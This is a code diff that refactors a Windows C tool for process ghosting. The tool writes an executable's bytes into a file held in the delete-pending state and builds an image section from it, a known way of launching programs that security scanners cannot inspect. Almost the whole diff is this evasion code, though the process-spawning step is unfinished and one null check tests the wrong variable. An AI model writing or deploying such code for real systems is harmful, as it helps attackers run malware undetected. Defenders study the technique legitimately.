@@ -41,23 +41,40 @@ unsigned int get_entrypoint(HANDLE hfile, DWORD f_size) {
 		fprintf(stderr, "[!] MapViewOfFile() failed (0x%x)\n", GetLastError());
 		return 0;
 	}
+
+	// Get DOS header
+	IMAGE_DOS_HEADER * dos_hdr = (IMAGE_DOS_HEADER*)(base_addr);
+
+	// Check DOS Signature
+	if (dos_hdr->e_magic != IMAGE_DOS_SIGNATURE) {
+		fprintf(stderr, "[!] Invalid DOS Signature\n");
+		return 0;
+	}
+
+	// Get offset of exe
+	LONG pe_offset = dos_hdr->e_lfanew;
+	
+	// Check if offst is greater than PE Header
+	if (pe_offset > 1024) {
+		fprintf(stderr, "[!] File address > PE header\n");
+		return 0;
+	}
+
+
 	return 1;
 }
 
-int spawn_process(char* real_exe, char* fake_exe) {
-	uint32_t rva_entryp;
-	NTSTATUS _status;
-	DWORD ho_fsz, lo_fsz;
-	IO_STATUS_BLOCK io_status;
-	HANDLE hfakefile, hrealfile,hsection;
-	FILE_DISPOSITION_INFORMATION f_fileinfo;
-	
-	printf("[i] Real Exe:\t\t%s\n", real_exe);
-	printf("[i] Fake Exe:\t\t%s\n", fake_exe);
 
-	// Create fake file 
-	hfakefile = CreateFileA(
-		fake_exe, 
+// Prepare fake_exe and put it in delete mode
+HANDLE prepare_target(char * target_exe) {
+	HANDLE h_tfile;
+	NTSTATUS _status;
+	IO_STATUS_BLOCK io_status;
+	FILE_DISPOSITION_INFORMATION f_fileinfo;
+
+	// Create Fake File
+	h_tfile = CreateFileA(
+		target_exe, 
 		DELETE | SYNCHRONIZE | FILE_GENERIC_READ | FILE_GENERIC_WRITE ,
 		FILE_SHARE_READ | FILE_SHARE_WRITE,
 		NULL,
@@ -66,18 +83,18 @@ int spawn_process(char* real_exe, char* fake_exe) {
 		NULL
 	);
 
-	if (hfakefile == INVALID_HANDLE_VALUE) {
-		fprintf(stderr, "[!] Failed to create: %s(0x%x)\n", fake_exe, GetLastError());
-		return -1;
+	if (h_tfile == INVALID_HANDLE_VALUE) {
+		fprintf(stderr, "[!] Failed to create: %s(0x%x)\n", target_exe, GetLastError());
+		return NULL;
 	}
 
-	printf("[i] Created File:\t%s\n", fake_exe);
+	printf("> Created File:\t%s\n", target_exe);
 
 	// Setting Target File in Delete Pending State
 	RtlZeroMemory(&io_status, sizeof(io_status));
 	FILE_INFORMATION_CLASS f_info = FileDispositionInformation;
 	_status = NtSetInformationFile(
-		hfakefile, 
+		h_tfile, 
 		&io_status, 
 		&f_fileinfo, 
 		sizeof(f_fileinfo),
@@ -85,21 +102,28 @@ int spawn_process(char* real_exe, char* fake_exe) {
 
 	if (!NT_SUCCESS(_status)) {
 		fprintf(stderr, "[!] NtSetInformationFile failed (0x%x)\n", _status);
-		CloseHandle(hfakefile);
-		return -2;
+		CloseHandle(h_tfile);
+		return NULL;
 	}
 
 	if (!NT_SUCCESS(io_status.Status)) {
 		fprintf(stderr, "[!] Failed to put file in 'Delete-Pending' State (0x%x)\n", _status);
-		CloseHandle(hfakefile);
-		return -2;
+		CloseHandle(h_tfile);
+		return NULL;
 	}
 
-	printf("[i] Successfully put file in 'Delete-Pending' mode\n");
+	printf("> Put file in 'Delete-Pending' state\n");
+	return h_tfile;		// Return handle to target file
+}
 
-	// Open the original file for reading
-	hrealfile = CreateFileA(
-		real_exe, 
+// Read original file
+unsigned char * read_orig_exe(char * original_exe) {
+	HANDLE hfile;
+	DWORD ho_fsz, lo_fsz;
+
+	// Open file for reading
+	hfile = CreateFileA(
+		original_exe, 
 		GENERIC_READ, 
 		0, 
 		NULL, 
@@ -107,34 +131,31 @@ int spawn_process(char* real_exe, char* fake_exe) {
 		FILE_ATTRIBUTE_NORMAL, 
 		NULL);
 
-	if (hrealfile == INVALID_HANDLE_VALUE) {
-		fprintf(stderr, "[!] Failed to get handle for:\t%s (0x%x)\n", real_exe, GetLastError());
-		CloseHandle(hfakefile);
-		return -3;
+	if (hfile == INVALID_HANDLE_VALUE) {
+		fprintf(stderr, "[!] Could not open %s for reading(0x%x)\n", original_exe, GetLastError());
+		return NULL;
 	}
-	
+	printf("> Opened Orifinal Exe for reading\n");
+
 	// Get File Size
-	lo_fsz = GetFileSize(hrealfile, &ho_fsz);
+	lo_fsz = GetFileSize(hfile, &ho_fsz);
 	if (lo_fsz == INVALID_FILE_SIZE) {
 		fprintf(stderr, "[!] Failed to get file size (0x%x)\n", GetLastError());
-		CloseHandle(hrealfile);
-		CloseHandle(hfakefile);
-		return -4;
+		CloseHandle(hfile);
+		return NULL;
 	}
-	printf("[i] File Size:\t\t%d\n", lo_fsz);
 
 	// Allocate memory
 	unsigned char* s_bytes = (unsigned char*)malloc(lo_fsz);
 	if (s_bytes == NULL) {
 		fprintf(stderr, "[!] Malloc() failed (0x%x)\n", GetLastError());
-		CloseHandle(hrealfile);
-		CloseHandle(hfakefile);
-		return -5;
+		CloseHandle(hfile);
+		return NULL;
 	}
 
 	// Read File
 	BOOL result = ReadFile(
-		hrealfile,
+		hfile,
 		s_bytes,
 		lo_fsz,
 		&ho_fsz,
@@ -142,31 +163,37 @@ int spawn_process(char* real_exe, char* fake_exe) {
 	);
 
 	if (!result) {
-		fprintf(stderr, "[!] Failed to read\t%s (0x%x)\n", real_exe, GetLastError());
+		fprintf(stderr, "[!] Failed to read\t%s (0x%x)\n", original_exe, GetLastError());
 		free(s_bytes);
-		CloseHandle(hrealfile);
-		CloseHandle(hfakefile);
-		return -6;
+		CloseHandle(hfile);
+		return NULL;
 	}
-	CloseHandle(hrealfile);
-	
-	// Write to Fake Exe
-	result = WriteFile(
-		hfakefile,
-		(LPCVOID)s_bytes,
-		lo_fsz,
-		&ho_fsz,
+	CloseHandle(hfile);
+	return s_bytes;
+}
+
+// Write to Fake file and create sections
+HANDLE fetch_sections(HANDLE hfile, unsigned char * f_bytes, DWORD f_size) {
+	BOOL _res;
+	HANDLE hsection;
+	DWORD _ho_fsz;
+	NTSTATUS _status;
+
+	// Write to open handle of the file to be deleted
+	_res = WriteFile(
+		hfile,
+		(LPCVOID)f_bytes,
+		f_size,
+		&_ho_fsz,
 		NULL
 	);
 
-	if (!result) {
-		fprintf(stderr, "[!] Failed to read\t%s (0x%x)\n", fake_exe, GetLastError());
-		free(s_bytes);
-		CloseHandle(hfakefile);
-		return -7;
+	if (!_res) {
+		fprintf(stderr, "[!] Failed to write payload (0x%x)\n", GetLastError());
+		return NULL;
 	}
-	free(s_bytes);
-	printf("[i] Wrote bytes to:\t%s\n", fake_exe);
+
+	printf("> Wrote %d bytes to target!\n", f_size);
 	
 	// Create section object
 	hsection = 0;
@@ -177,25 +204,58 @@ int spawn_process(char* real_exe, char* fake_exe) {
 		0,
 		PAGE_READONLY, 
 		SEC_IMAGE,
-		hfakefile
+		hfile
 	);
 
 	if (!NT_SUCCESS(_status)) {
 		fprintf(stderr, "[!] NtCreateSession() failed! (0x%x)\n", _status);
-		CloseHandle(hfakefile);
-		return -8;
+		return NULL;
 	}
 
 	if (hsection == INVALID_HANDLE_VALUE || hsection == NULL) {
-		fprintf(stderr, "[!] Invalid Handle returned by NtCreateSession()\n");
-		CloseHandle(hfakefile);
-		return -9;
+		fprintf(stderr, "[!] Invalid Handle returned by NtCreateSession() (0x%x)\n", _status);
+		return NULL;
 	}
 
-	printf("[i] Created a session object!\n");
+	printf("> Created a session object!\n");
+	return hsection;
+}
+
+// Spawn a process using ghosting
+int spawn_process(char* real_exe, char* fake_exe) {
+	DWORD f_size;
+	HANDLE hfakefile, hsection;
+
+	// Create fake executable and put it in delete-pending state
+	hfakefile = prepare_target(fake_exe);
+	if (NULL == hfakefile) {
+		return -1;
+	}
+
+	// read contents from the real executable
+	unsigned char * f_bytes = read_orig_exe(real_exe);
+	if (real_exe == NULL) {
+		CloseHandle(hfakefile);
+		return -2;
+	}
+
+	f_size = (DWORD)_msize(f_bytes);
+	
+	hsection = fetch_sections(hfakefile, f_bytes, f_size);
+ 	free(f_bytes);
+	if (hsection == NULL) {
+		CloseHandle(hfakefile);
+		return -3;
+	}
 
 
+	// unsigned int _res = get_entrypoint(hfakefile, lo_fsz);
+	// if (_res == 0) {
+	// 	fprintf(stderr, "[!] Failed to get Entry Point\n");
+	// 	return -10;
+	// }
 
+	// CloseHandle(hsection);
 	CloseHandle(hsection);
 	CloseHandle(hfakefile);
 	return 0;
@@ -208,6 +268,8 @@ int main(int argc, char** argv) {
 		fprintf(stderr, "[i] Usage: %s <REAL EXE> <FAKE EXE>\n", argv[0]);
 		return -1;
 	}
+
+	printf("==== Ghost Prcesses, Not People ====\n");
 
 	char real_exe[MAX_PATH] = { 0 };
 	char fake_exe[MAX_PATH] = { 0 };
